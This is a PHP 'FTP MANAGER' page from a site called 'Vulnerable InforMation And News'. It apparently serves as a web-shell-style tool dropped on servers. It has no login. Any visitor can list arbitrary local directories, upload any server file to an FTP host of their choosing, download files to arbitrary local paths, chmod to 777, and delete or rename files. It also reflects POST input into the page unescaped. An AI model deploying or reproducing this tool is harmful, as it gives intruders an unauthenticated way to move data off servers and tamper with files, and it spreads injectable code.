<?php
set_time_limit(0);
ignore_user_abort(true);
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<style type="text/css"> 
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
</style>
</head>
<body>
<script>
function downf(oldname){
	var newfilename;
	$('downfile').value=oldname;
	newfilename = prompt('Former file name:'+oldname+'\nFile Download To :', '<?php echo str_replace('\\','/',dirname(__FILE__));?>/'+oldname+'');
	if (!newfilename) return;
	$('downto').value=newfilename;
    $('ftp2').submit();
}
function rename(oldname){
	var newfilename;
	$('renamedirold').value=oldname;
	newfilename = prompt('Former folder name:'+oldname+'\nPlease input new folder name :', ''+oldname+'');
	if (!newfilename) return;
	$('renamedirnew').value=newfilename;
    $('ftp2').submit();
}
function delfile(dir,m){
	if (m && !confirm(m)) {
		return;
	}
	$('delfile').value=dir;
    $('ftp2').submit();
}
function editf(file){
	$('editfile3').value=file;
    $('ftp3').submit();
}
function delfolder(dir,m){
	if (m && !confirm(m)) {
		return;
	}
	$('delfolder').value=dir;
    $('ftp2').submit();
}
function mdir(){
	$('mkdir2').value=$('mkdir').value;
	$('ftp2').submit();
}

function upf(){
    var up=$('upfilex').value;
	$('upfile2').value=up;
	$('ftp2').submit();
}

function chmodd(file,chmod1){
	chmod1 = prompt('Chmod:'+file+'\nPlease input new chmod:', '777');
	if (!chmod1) return;
	$('chmod').value=chmod1;
	$('chmoddir').value=file;
    $('ftp2').submit();
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
	}
function godir(dir){
    var k=0000000;
    if(dir.indexOf('updir')!=-1)k=1;
	if(dir.indexOf('setdir')!=-1)k=2;
	switch(k){
	     case 1:{
	            var updir=$('dir').value;
	            updir=updir.substring(0,updir.length-1);
	            var ndir=updir.split("/");
	            var ddir="";
                    for(var i=0;i<ndir.length-1;i++){
	                    if(ndir[i].length==0)continue;
                        ddir=ddir+(ndir[i]+"/");}
	             $('dir').value='/'+ddir;
				 $('ftp2').submit();
				 break;
	              }
		 case 2:{$('dir').value=$('cdir').value;$('ftp2').submit();break;}
	
	     default:{
	          var n2dir=$('dir').value+'/'+dir;
			  n2dir=n2dir.split("/");
	          var d2dir="";
	          for(var i=0;i<n2dir.length;i++){
	                 if(n2dir[i].length==0)continue;
                     d2dir=d2dir+(n2dir[i]+"/");
			          }
	                $('dir').value='/'+d2dir;$('ftp2').submit();break;
		           }
	}}
</script>
<?php
if(!function_exists('ftp_connect')||!function_exists('ftp_login')){echo "<font color=red>ftp function is disabled !</font>";exit;}

function view_dir($directory)
{
    $handle = opendir( $directory );
    while ( $file = readdir($handle) )
    {
        $bdir = $directory . '/' .$file;
        if( $file <> '.' && $file <> '..')
        {     
		 if(is_dir($directory.$file))
		      echo "<font face=\"Wingdings 3\" size=\"4\">u</font> : <input class='input' type='text' value='".$directory.$file."' name='fn1' id='fn1' size=80><br>";
		 else      
		      echo "<font face=\"Wingdings 3\" size=\"4\">a</font> : <input class='input' type='text' value='".$directory.$file."' name='fn2' id='fn2' size=80><br>";  
        }
    }
    closedir( $handle );
}
if($_POST['mlist']){
if(is_dir(trim($_POST['upfile'])))
view_dir(trim($_POST['upfile']));
else 
echo "Not Dir!";
exit;
}
?>
<?php
if(!($_POST['ip'])||!($_POST['port'])||!($_POST['user'])||!($_POST['pass'])){
?>
<form  name="form1" method="post" id="actionftp" action="">
  <p align="center"><a href="http://www.vul.kr">WWW.VUL.KR</a> FTP MANAGER </p>
  <p align="center">IPADD : 
    <input name="ip" class="input" type="text" id="ip" value="" />
   PORT : 
  <input name="port" class="input" type="text" id="port" value="21" />
  </p>
  <p align="center">USER : 
    <input class="input" name="user" type="text" id="user" value="" /> 
    PASS :  
    <input class="input" name="pass" type="text" id="pass" value="" />
	<input name="dir" type="hidden" value="."  id="dir">
  </p>
  <p align="center">
    <label>
    <input type="submit" class="bt" name="Submit" value="Get In .." />
    </label>
</p>
</form>
<?php
}
else{
?>
<form name="form1" method="post" id="ftp2" action="">
    <input name="ip" type="hidden" id="ip" value="<?php echo $_POST['ip']?>" />
    <input name="port" type="hidden" id="port" value="<?php echo $_POST['port']?>" />
    <input name="user" type="hidden" id="user" value="<?php echo $_POST['user']?>" /> 
    <input  name="pass" type="hidden" id="pass" value="<?php echo $_POST['pass']?>" />
	<input name="dir" type="hidden" value="<?php echo $_POST['dir'];?>"  id="dir">
	<input name="chmod" type="hidden" value="/"  id="chmod">
	<input name="upfile2" type="hidden" value="/"  id="upfile2">
	<input name="chmoddir" type="hidden" value="/"  id="chmoddir">
	<input name="delfile" type="hidden" value="/"  id="delfile">
	<input name="downto" type="hidden" value="/"  id="downto">
	<input name="delfolder" type="hidden" value="/"  id="delfolder">
	<input name="downfile" type="hidden" value="/"  id="downfile">
	<input name="editfile" type="hidden" value="/"  id="editfile">
	<input name="mkdir2" type="hidden" value="/"  id="mkdir2">
	<input name="renamedirnew" type="hidden" value="/"  id="renamedirnew">
	<input name="renamedirold" type="hidden" value="/"  id="renamedirold">
  </p>
</form>
<form name="form3" method="post" id="ftp3" action="" target="_blank">
    <input name="ip" type="hidden" id="ip" value="<?php echo $_POST['ip']?>" />
    <input name="port" type="hidden" id="port" value="<?php echo $_POST['port']?>" />
    <input name="user" type="hidden" id="user" value="<?php echo $_POST['user']?>" /> 
    <input  name="pass" type="hidden" id="pass" value="<?php echo $_POST['pass']?>" />
	<input name="dir" type="hidden" value="<?php echo $_POST['dir'];?>"  id="dir">
	<input name="editfile3" type="hidden" value="/"  id="editfile3">
</form>
<?php
if(($_POST['editfile3'])&&substr(trim($_POST['editfile3']),0,1)!='/'){
if((substr((strtoupper(php_uname())),0,3)=='WIN'))
$sessdir='c:/windows/temp';
else
$sessdir='/tmp';
$downsdir=$sessdir."/923923844223";
if(!is_writable($sessdir)){echo "Temp Path isn't writable !";exit;}
$conn_id = ftp_connect(trim($_POST['ip']),trim($_POST['port']))or die("Make Connection To ".$_POST['ip']." At Port ".$_POST['port']." Error!");
$login_result = ftp_login($conn_id, trim($_POST['user']), trim($_POST['pass']))or die("Login Error!");;
ftp_pasv( $conn_id, true );
$dir=trim($_POST['dir']);
ftp_chdir($conn_id,$dir);
if (ftp_get($conn_id, $downsdir, trim($_POST['editfile3']), FTP_BINARY)){
echo "<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td><h2>View File &raquo;</h2><p>Current File <br /><input class=\"input\" name=\"editfilename\" id=\"editfilename\" value='".$_POST['dir'].$_POST['editfile3']."'type=\"text\" size=\"100\"  /></p>
<p>File Content<br /><textarea class=\"area\" id=\"filecontent\" name=\"filecontent\" cols=\"100\" rows=\"25\" >".htmlspecialchars(file_get_contents($downsdir))."</textarea></p><p><input class=\"bt\" name=\"submit\" id=\"submit\" type=\"submit\" value=\"Submit\"></p></form></td></tr></table>";
}
else
{echo "Download File Error";exit;}
exit;
}
?>
<?php
}?>
<?php
function cutspaces($str){
   while(substr($str,0,1)==" "){$str=substr($str,1);}
   return $str;
   }
   
function sizecount($size) {
	if($size > 1073741824) {
		$size = round($size / 1073741824 * 100) / 100 . ' G';
	} elseif($size > 1048576) {
		$size = round($size / 1048576 * 100) / 100 . ' M';
	} elseif($size > 1024) {
		$size = round($size / 1024 * 100) / 100 . ' K';
	} else {
		$size = $size . ' B';
	}
	return $size;
}
function ftp_files($list){
global $ch;
for($i=0;$i<sizeof($list);$i++){
   list($permissions,$next)=split(" ",$list[$i],2);
   list($num,$next)=split(" ",cutspaces($next),2);
   list($owner,$next)=split(" ",cutspaces($next),2);
   list($group,$next)=split(" ",cutspaces($next),2);
   list($size,$next)=split(" ",cutspaces($next),2);
   list($month,$next)=split(" ",cutspaces($next),2);
   list($day,$next)=split(" ",cutspaces($next),2);
   list($year_time,$filename)=split(" ",cutspaces($next),2);
   if($filename!="." && $filename!=".."){
       if(substr($permissions,0,1)=="d"){
           echo "<tr class=\"alt2\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='alt2';\">
<td nowrap>";
          if($ch) echo "<a href=\"javascript:godir('".$filename."')\">".$filename."</a>";
		        else
			echo $filename;
			echo "</td><td nowrap>".$owner."</td><td nowrap>".$group."</td><td nowrap><a href=\"javascript:chmodd('".$filename."','777');\">".$permissions."</a></td><td nowrap>".$size."</td><td nowrap>".$month.$day." ".$year_time."<td nowrap><a href=\"javascript:delfolder('".$filename."','Delete Folder ".$filename." ?')\">Delete</a> | <a href=\"javascript:rename('".$filename."')\">Rename</a></td></tr>";
       } else {
                      echo "<tr class=\"alt2\" onmouseover=\"this.className='focus';\" onmouseout=\"this.className='alt2';\">
<td nowrap>".$filename."</td><td nowrap>".$owner."</td><td nowrap>".$group."</td><td nowrap><a href=\"javascript:chmodd('".$filename."','777');\">".$permissions."</a></td><td nowrap>".sizecount($size)."</td><td nowrap>".$month.$day." ".$year_time."<td nowrap><a href=\"javascript:editf('".$filename."')\">View</a> | <a href=\"javascript:downf('".$filename."')\">Download</a> | <a href=\"javascript:delfile('".$filename."','Delete File ".$filename." ?')\">Delete</a> | <a href=\"javascript:rename('".$filename."')\">Rename</a></td></tr>";}}}}

if($_POST['ip'] && $_POST['port'] && $_POST['user'] && $_POST['pass'] && !($_POST['mlist'])){ 
$conn_id = ftp_connect(trim($_POST['ip']),trim($_POST['port']))or die("Make Connection To ".$_POST['ip']." At Port ".$_POST['port']." Error!");
$login_result = ftp_login($conn_id, trim($_POST['user']), trim($_POST['pass']))or die("Login Error!");
ftp_pasv( $conn_id, true );
$dir=trim($_POST['dir']);
$ch=ftp_chdir($conn_id,$dir);
if(!$ch)
{$tmp="<font color=red>Change Dir To    $dir    Failed , Now   Return !</font>";
}
//------------Files Perm----------------------------------------------------------------------------------------------------------
if(($_POST['chmod'])&&($_POST['chmoddir'])&&substr(trim($_POST['chmod']),0,1)!='/'&&substr(trim($_POST['chmoddir']),0,1)!='/'){
if (ftp_site($conn_id, 'CHMOD '.trim($_POST['chmod']).' '.trim($_POST['chmoddir']).'')) 
$tmp='<font color=red> CHMOD '.trim($_POST['chmod']).' '.trim($_POST['chmoddir']).' successfully !</font>';
else
$tmp='<font color=red>CHMOD '.trim($_POST['chmod']).' '.trim($_POST['chmoddir']).' failed !</font>';
}
//---------Rename Folder and file------------------------------------------------------------------------------------------------
if(($_POST['renamedirold'])&&substr(trim($_POST['renamedirold']),0,1)!='/' && ($_POST['renamedirnew']) &&substr(trim($_POST['renamedirnew']),0,1)!='/'){
if(ftp_rename($conn_id, trim($_POST['renamedirold']), trim($_POST['renamedirnew']))) {
       $tmp="<font color=red>".trim($_POST['renamedirold'])." Rename to ".trim($_POST['renamedirnew'])." Successfully !</font>";
} else {
       $tmp="<font color=red>".trim($_POST['renamedirold'])." Rename to ".trim($_POST['renamedirnew'])." Failed !</font>";
}
}
//------------Delete File-------------------------------------------------------------------------------------------------------
if(($_POST['delfile'])&&substr(trim($_POST['delfile']),0,1)!='/'){
if(ftp_delete($conn_id,trim($_POST['delfile']))) 
$tmp="<font color=red>Delete File ".trim($_POST['delfile'])." Successfully !</font>";
else
$tmp="<font color=red>Delete File ".trim($_POST['delfile'])." Failed !</font>";
}
//----------Delete Folder------------------------------------------------------------------------------------------------------
if(($_POST['delfolder'])&&substr(trim($_POST['delfolder']),0,1)!='/'){
if(ftp_rmdir($conn_id,trim($_POST['delfolder']))) 
$tmp="<font color=red>Delete Folder ".trim($_POST['delfolder'])." Successfully !</font>";
else
$tmp="<font color=red>Delete Folder ".trim($_POST['delfolder'])." Failed !</font>";
}

//---------Down File-----------------------------------------------------------------------------------------------------------
if(($_POST['downfile'])&&($_POST['downto'])&&strlen(trim($_POST['downto']))!=1&&substr(trim($_POST['downfile']),0,1)!='/'&&strlen(trim($_POST['downto']))>1){
if (ftp_get($conn_id, trim($_POST['downto']), trim($_POST['downfile']), FTP_BINARY))
    $tmp="<font color=red>Download ".trim($_POST['downfile'])." to ".trim($_POST['downto'])."Successfully !</font>";
else 
    $tmp="<font color=red>Download ".trim($_POST['downfile'])." to ".trim($_POST['downto'])." Failed !</font>";
}
//--------------Make Dir------------------------------------------------------------------------------------------------------
if(($_POST['mkdir2'])&&substr(trim($_POST['mkdir2']),0,1)!='/'){
if(ftp_mkdir($conn_id, trim($_POST['mkdir2'])))
    $tmp="<font color=red>Make Dir ".trim($_POST['mkdir2'])."Successfully !</font>";
else 
    $tmp="<font color=red>Make Dir".trim($_POST['mkdir2'])." Failed !</font>";
}
//-----------Upfile----------------------------------------------------------------------------------------------------------
if(($_POST['upfile2'])&&strlen(trim($_POST['upfile2']))>2){
if(is_dir(trim($_POST['upfile2']))||!file_exists(trim($_POST['upfile2'])))$tmp="<font color=red>It Is dir or File ".trim($_POST['upfile2'])." not exist !</font>";
if(is_file(trim($_POST['upfile2']))&&file_exists(trim($_POST['upfile2']))){
$e=explode("/",trim($_POST['upfile2']));
$n=count($e)-1;
$desdir=$e[$n];
if(ftp_put($conn_id, $desdir, trim($_POST['upfile2']), FTP_ASCII))
    $tmp="<font color=red>Upfile ".trim($_POST['upfile2'])."Successfully !</font>";
else 
    $tmp="<font color=red>Upfile ".trim($_POST['upfile2'])." Failed !</font>";
}}
$pwd=ftp_pwd($conn_id);
$list=ftp_rawlist($conn_id,'.');
echo "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">";
echo "<tr class=\"head\"><td><span style=\"float:right;\"></span>".$_POST['ip']." : ".$_POST['port']."</td><td>".$tmp."</td></tr></table>";
echo "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">";
echo "<tr ><td nowrap>Current Directory</td><td width=\"100%\"><input class=\"input\" id='cccdir' name=\"cdir\" value='".$pwd."' type=\"text\" style=\"width:100%;margin:0 8px;\"></td><td nowrap><input class=\"bt\" value=\"GO\" type=\"button\" onclick=\"javascript:godir('setdir');\"></td></tr></table>";
echo "<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\"><tr class=\"alt1\"><form method='post' name='formp' target='_blank'><td  nowrap style=\"padding:5px;line-height:20px;\">Make Dir : <input class='input' type='text' value='test' name='mkdir' id='mkdir'><input class=\"bt\" value=\"Make\" type=\"button\" onclick=\"javascript:mdir();\"></td><td nowrap style=\"padding:5px;line-height:20px;\">Upfile : <input class='input' type='text' value='".str_replace('\\','/',dirname(__FILE__))."/' name='upfile' size='60' id='upfilex'><input class=\"bt\" value=\"Upfile\" type=\"button\" onclick=\"javascript:upf();\"></td><td><input class='bt' value='list' name='mlist' type='submit'></td><td nowrap colspan=\"4\" style=\"padding:5px;line-height:20px;\"></td></tr></form>";
echo '<tr class="head"><td>Filename</td><td width="5%">Owner</td><td width="5%">Group</td><td width="5%">Chmod</td><td width="5%">Size</td><td width="5%">Time</td><td>Action</td></tr>';
echo "<tr class=\"alt1\"><td><font face=\"Wingdings 3\" size=\"4\">=</font><a href=\"javascript:godir('updir');\">Parent Directory</a></td><td nowrap colspan=\"6\"></td></tr>";

ftp_files($list);
echo "</table>";

ftp_close($conn_id);}
echo '</body>';
echo '<center><div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	<span style="float:right;"></span>
	Copyright (C) 2004-2009 <a href="http://www.vul.kr" target="_blank">Vulnerable InforMation And News</a> All Rights Reserved.
</div></center>';
echo '</html>';
?> 